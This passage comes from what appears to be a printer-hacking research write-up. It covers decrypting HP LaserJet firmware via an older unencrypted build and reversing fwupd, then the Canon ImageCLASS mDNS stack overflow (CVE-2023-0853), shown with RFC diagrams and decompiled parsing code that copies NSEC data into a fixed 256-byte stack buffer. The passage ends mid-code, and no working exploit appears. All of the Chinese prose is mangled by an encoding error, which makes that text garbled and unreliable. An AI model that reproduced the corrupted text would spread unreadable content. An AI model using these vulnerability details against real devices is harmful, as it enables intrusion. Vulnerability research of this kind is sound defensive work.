&lt;h4 id=&quot;firmware-extract&quot;&gt;Firmware Extract&lt;/h4&gt;

&lt;p&gt;èˆ‡ 2021 å¹´ç›¸åŒï¼Œå¯åƒè€ƒ&lt;a href=&quot;/blog/2023/10/05/your-printer-is-not-your-printer-hacking-printers-pwn2own-part1/&quot;&gt;å‰è¿°&lt;/a&gt;éƒ¨åˆ†ï¼Œæœ¬æ¬¡ç‰ˆæœ¬ç‚º v11.04 ã€‚&lt;/p&gt;

&lt;h3 id=&quot;hp&quot;&gt;HP&lt;/h3&gt;

&lt;p&gt;Firmware æœ¬èº«å¯ä»¥å¾ HP çš„ Firmware &lt;a href=&quot;https://ftp.ext.hp.com/pub/networking/software/pfirmware/pfirmware.glf&quot;&gt;ç¶²ç«™&lt;/a&gt; ä¸­å–å¾—ï¼Œä½†èˆ‡ 2021 å¹´ä¸åŒï¼Œä¸¦&lt;strong&gt;ç„¡æ³•&lt;/strong&gt;ç›´æ¥ç”¨ binwalk è§£å‡ºï¼Œé€™é‚Šçš„ Firmware æ˜¯é€é AES åŠ å¯†çš„ï¼Œå¾ç¾æœ‰çš„è³‡è¨Šä¸­ä¸å¤ªå¥½ç›´æ¥è§£é–‹ã€‚&lt;/p&gt;

&lt;p&gt;è€Œé€™é‚Šèµ·åˆæƒ³æ³•æ˜¯æ‰¾ç›¸åŒç³»åˆ—çš„ Fimware çœ‹çœ‹æ˜¯å¦æœ‰æœªåŠ å¯†ç‰ˆæœ¬ï¼Œç„¶è€Œ HP å®˜æ–¹çš„ Firmware ä¸­ï¼Œä¸¦æ²’æœ‰ç¬¦åˆæ¢ä»¶çš„ Firmwareï¼ŒåŸæœ¬æ‰“ç®—æ‹†å°è¡¨æ©Ÿæƒ³è¾¦æ³• Dump firmwareï¼Œä½†æˆ‘å€‘å¾Œä¾†åœ¨ Google çš„éç¨‹ä¸­ï¼Œæ‰¾åˆ°äº†èˆŠç‰ˆçš„ mirror ç«™ï¼Œè€Œè©²ç¶²ç«™æœ‰é–‹ index ofï¼Œæˆ‘å€‘å¯ä»¥å¾ä¸­ç²å¾—æ‰€æœ‰åœ¨ mirror ç¶²ç«™ä¸­çš„ Firmwareã€‚&lt;/p&gt;

&lt;p&gt;ä½†é€™é‚Šå•é¡Œæ˜¯è©² Mirror ç¶²ç«™åªæœ‰ mirror åˆ° 2016 ä¸¦æ²’æœ‰æœ€æ–°ç‰ˆæœ¬çš„è³‡è¨Šï¼Œä¸éå¾Œä¾†å¯ä»¥å¾ç¶²ç«™è³‡è¨Šä¸­ï¼Œç²å¾—å®˜æ–¹çš„ç›®éŒ„çµæ§‹ï¼Œå¾è€Œå–å¾—ç›¸åŒç³»åˆ—çš„ä½†æ²’æœ‰åŠ å¯†çš„ Firmwareã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231106/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨åˆ†æéå¾Œï¼Œæˆ‘å€‘å¾ Firmware ä¸­æ‰¾åˆ° fwupd ä¸­æœ‰è§£å¯†ç›¸é—œè³‡è¨Šï¼Œé€éé€†å‘å¯ä»¥çŸ¥é“åŠ å¯†æ–¹æ³•åŠ Keyï¼Œé€²è€Œè§£å‡ºç›®æ¨™ç‰ˆæœ¬çš„ Firmwareã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231106/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;hp-collor-laserjet-pro-m479fdw&quot;&gt;HP Collor LaserJet Pro M479fdw&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;OS - Linux Base&lt;/li&gt;
  &lt;li&gt;ARMv7 32bit little-endian&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;vulnerability--exploitation&quot;&gt;Vulnerability &amp;amp; Exploitation&lt;/h2&gt;

&lt;h3 id=&quot;canon-1&quot;&gt;Canon&lt;/h3&gt;

&lt;h4 id=&quot;mdns-cve-2023-0853&quot;&gt;mDNS (CVE-2023-0853)&lt;/h4&gt;
&lt;p&gt;mDNS å”å®šä¸»è¦æä¾›äº†å€ç¶²ä¸­çš„åŸŸåè§£æåŠŸèƒ½ï¼Œä¸¦ä¸”ä¸éœ€è¦æœ‰ Name Server çš„ä»‹å…¥ï¼Œå¸¸ç”¨æ–¼ Apple åŠ IoT è¨­å‚™ä¸­ã€‚&lt;/p&gt;

&lt;p&gt;è€Œåœ¨ Canon ä¸­ï¼Œé è¨­æƒ…æ³ä¸‹ï¼Œä¹Ÿæä¾›äº†ç›¸åŒçš„åŠŸèƒ½ï¼Œæ–¹ä¾¿ä½¿ç”¨è€…å°‹æ‰¾å€ç¶²ä¸­çš„å°è¡¨æ©Ÿã€‚&lt;/p&gt;

&lt;p&gt;è©²å”å®šä¸»è¦ä»¥ DNS ç‚ºåŸºç¤ï¼ŒåŸºæœ¬ä¸Š mDNS ä¹Ÿå¤§å¤šå»ºç«‹åœ¨ DNS å°åŒ…æ ¼å¼ &lt;a href=&quot;https://www.ietf.org/rfc/rfc1035.txt&quot;&gt;(RFC1035)&lt;/a&gt; ä¸Šï¼Œæ ¼å¼å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;The packet format:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    +---------------------+
    |        Header       |
    +---------------------+
    |       Question      | the question for the name server
    +---------------------+
    |        Answer       | RRs answering the question
    +---------------------+
    |      Authority      | RRs pointing toward an authority
    +---------------------+
    |      Additional     | RRs holding additional information
    +---------------------+
(diagram from https://www.ietf.org/rfc/rfc1035.txt)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;The header contains the following fields:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                                    1  1  1  1  1  1
      0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                      ID                       |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |QR|   Opcode  |AA|TC|RD|RA|   Z    |   RCODE   |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    QDCOUNT                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    ANCOUNT                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    NSCOUNT                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    ARCOUNT                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
(diagram from https://www.ietf.org/rfc/rfc1035.txt)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ä¸»è¦å¯ä»¥æ‹†åˆ†ç‚º Header åŠ body éƒ¨åˆ†ï¼Œä¸»è¦çš„è«‹æ±‚éƒ½æ”¾åœ¨ body ä¸­ï¼Œå¾Œé¢ä¸‰å€‹æ¬„ä½ç‚ºåŒæ¨£çš„æ ¼å¼ã€‚ Answer æ¬„ä½ä¸»è¦ç´€éŒ„é‡å° Question çš„ Resource records (RRs)ï¼Œ&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Resource record format:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                                    1  1  1  1  1  1
      0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                                               |
    /                                               /
    /                      NAME                     /
    |                                               |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                      TYPE                     |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                     CLASS                     |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                      TTL                      |
    |                                               |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                   RDLENGTH                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--|
    /                     RDATA                     /
    /                                               /
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
(diagram from https://www.ietf.org/rfc/rfc1035.txt)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;RDATA éƒ¨åˆ†æœƒæ ¹æ“š type ä¸åŒè€Œæœ‰æ‰€ä¸åŒï¼Œè€Œç•¶ type=NSEC å…¶æ ¼å¼å¦‚ä¸‹&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   The RDATA of the NSEC RR is as shown below:

                        1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   /                      Next Domain Name                         /
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   /                       Type Bit Maps                           /
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
(diagram from https://www.ietf.org/rfc/rfc4034.txt)

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å…¶é¤˜éƒ¨åˆ†åœ¨é€™å€‹æ¼æ´ä¸­ä¸å¤ªé‡è¦ï¼Œä¸å¦å¤–å¤šåšè©³ç´°è§£é‡‹ï¼Œæ›´å¤šç´°ç¯€å¯ä»¥åƒè€ƒ &lt;a href=&quot;https://datatracker.ietf.org/doc/rfc6762/&quot;&gt;RFC6762&lt;/a&gt; ã€ &lt;a href=&quot;https://datatracker.ietf.org/doc/rfc1035/&quot;&gt;RFC1035&lt;/a&gt;
ä»¥åŠ &lt;a href=&quot;https://datatracker.ietf.org/doc/rfc4034/&quot;&gt;RFC4034&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;æ¼æ´ä½ç½®&lt;/strong&gt;
ç•¶ Canon ImageCLASS MF743Cdw åœ¨è™•ç† Answer æ¬„ä½(type=NSEC)æ™‚ï¼Œä¸¦æ²’æœ‰æª¢æŸ¥é•·åº¦å°è‡´ stack overflow ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231106/3.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bnMdnsParseAnswers&lt;/code&gt; function æ˜¯ä¸»è¦è² è²¬è™•ç†å°åŒ…ä¸­ answer æ¬„ä½&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;bnMdnsParseAnswers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mdns_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppayloadlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pmdns_header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;_WORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;anwser_rr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;rrlist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nsec_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// ------ fixed size on the stack&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    
  &lt;span class=&quot;n&quot;&gt;_mdns_packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mdns_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p_payloadlen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ppayloadlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p_mdns_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pmdns_header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;anwser_cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;anwser_rr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v66&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;cur_ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mdns_packet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rrlist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aBnmdnsparseans&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v67&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;anwser_cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v67&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_36&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x21&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;47&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;                         &lt;span class=&quot;c1&quot;&gt;// NSEC&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_95&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v62&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v63&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;zeromemory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v47&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bnMdnsMalloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;rrlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v47&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v47&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;bnMdnsFreeRRLIST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rrlist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v50&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2720&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;LABEL_76:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;debugprintff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
          &lt;span class=&quot;mi&quot;&gt;3610&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;&quot;[bnjr] [%s] &amp;lt;%s:%d&amp;gt; bnMdnsParseAnswers error in malloc(NSEC)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;&quot;IMP/mdns/common/tcBnMdnsMsg.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;maybe_realloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v47&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;nsec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rrlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
